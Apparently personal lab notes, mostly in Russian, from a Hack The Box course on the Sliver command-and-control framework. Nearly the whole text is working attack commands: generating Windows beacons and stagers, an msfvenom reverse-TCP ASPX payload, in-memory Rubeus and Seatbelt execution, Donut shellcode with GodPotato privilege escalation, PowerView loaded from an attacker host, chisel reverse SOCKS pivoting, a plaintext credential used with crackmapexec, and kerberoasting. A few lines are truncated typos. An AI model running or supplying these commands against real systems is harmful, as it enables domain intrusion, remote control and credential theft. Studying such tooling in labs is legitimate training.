# Sliver
Sliver
# Устновка v1.5.42
    wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
    chmod +x ./sliver-server_linux
    new-operator -n student -l 10.10.14.193
    multiplayer

    get -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
    mxdelta@htb[/htb]$ chmod +x ./sliver-client_linux
    mxdelta@htb[/htb]$ ./sliver-client_linux import student_10.10.14.193.cfg 

    armory install seatbelt

  # Создание маячков и сессий
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
    http -L 10.10.16.14 -l 9001

# Создание профилей и шелкодов
    Для использования загрузчика нам потребуется создать профиль, прослушиватель этапа и загрузчик, не забыв при этом сгенерировать полезную нагрузку через msfvenom. Обратите внимание, что используемые порты можно изменить в соответствии с вашими потребностями.

    profiles new --http 10.10.14.62:8088 --format shellcode htb

    stage-listener --url tcp://10.10.14.62:4443 --profile htb

    http -L 10.10.14.62 -l 8088

    generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
        //[*] Sliver implant stager saved to: /home/htb-ac590/staged.txt

    После создания поэтапной полезной нагрузки ( staged.txt), нам потребуется сгенерировать msfvenom aspx полезная нагрузка.
 
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx

    Далее нам потребуется принять сгенерированную полезную нагрузку. staged.txt и изменить полезную нагрузку в Page_Loadфункция. byte[]Массив будет определен под другим именем; очень важно указать это. new byte[511]массив из staged.txtв byte[] mO0UYобъявление в приведенном ниже примере в sliver.aspx файл. 

# Команда - загрузка - выгрузка
    download Pictures
    upload academy.txt C:\\Users\\eric\\Desktop\\academy.txt
    
# Команда - выполнить сборку 
    execute-assembly /home/htb-ac590/SharpCollection/NetFramework_4.0_Any/Seatbelt.exe -group=system
    Этот процесс можно наблюдать и при использовании расширения, эквивалентного оружейной. Seatbelt.
    
    sliver (http-session) > seatbelt -- -group=system
# Donut Setup (Donut — это инструмент, предназначенный для создания бинарных шеллкодов, которые могут быть выполнены в памяти; Donutсгенерирует шеллкод исполняемого файла .NET, который можно выполнить с помощью execute-shellcodeаргумент в Sliver. )
    git clone https://github.com/TheWover/donut
    mxdelta@htb[/htb]$ ./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
    generate beacon --http 10.10.14.62:9002 --skip-symbols -N http-beacon
    upload http-beacon.exe
    http --lhost 10.10.14.62 --lport 9002
    execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
        //[+] ProcessID       : 5668
    execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin


# Разведка домена 
    echo -n "get-netuser | select  samaccountname,description" | base64 
    Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u
    sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
    execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M

# Pivoting
    mxdelta@htb[/htb]$ git clone https://github.com/MrAle98/chisel
    sliver (http-beacon) > chisel
    mxdelta@htb[/htb]$ chisel server --reverse -p 1337 -v --socks5
    liver (http-beacon) > chisel client 10.10.14.62:1337 R:socks
    proxychains crackmapexec smb 172.16.1.12 -u svc_sql -p 'jkhnrjk123!'

# Kerberos Exploitation
    после установления сессии
    inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
    inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
    
# Impersonation



    

